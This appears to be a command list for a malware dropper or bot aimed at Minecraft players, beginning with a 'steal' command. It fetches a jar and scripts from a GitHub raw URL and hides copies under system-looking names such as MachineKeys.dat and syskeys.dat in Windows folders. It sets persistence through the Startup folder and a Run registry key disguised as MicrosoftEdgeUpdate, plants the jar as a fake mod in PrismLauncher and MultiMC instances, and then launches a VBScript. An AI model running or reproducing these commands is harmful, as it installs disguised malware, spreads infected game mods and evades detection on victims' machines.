# my commands
version: 6
steal
mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat
put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Protect\syskeys.dat
put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Windows\WER\ReportArchive\crash.dat
put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\.minecraft\mods\xaerolib-compat.jar
put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/cache-helper.cmd %APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd
put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/boot.vbs %APPDATA%\Microsoft\Crypto\RSA\boot.vbs
shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Crypto\RSA\MachineKeys.bat" 2>nul
shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Protect\syskeys.bat" 2>nul
shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Windows\WER\ReportArchive\wersvc.cmd" 2>nul
shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.cmd" 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftEdgeUpdate /t REG_SZ /d "wscript.exe ""%APPDATA%\Microsoft\Crypto\RSA\boot.vbs""" /f 2>nul
shell for /d %d in ("%APPDATA%\PrismLauncher\instances\*") do copy /y "%APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat" "%d\minecraft\mods\xaerolib-compat.jar" 2>nul
shell for /d %d in ("%APPDATA%\MultiMC\instances\*") do copy /y "%APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat" "%d\minecraft\mods\xaerolib-compat.jar" 2>nul
shell wscript.exe "%APPDATA%\Microsoft\Crypto\RSA\boot.vbs" 2>nul
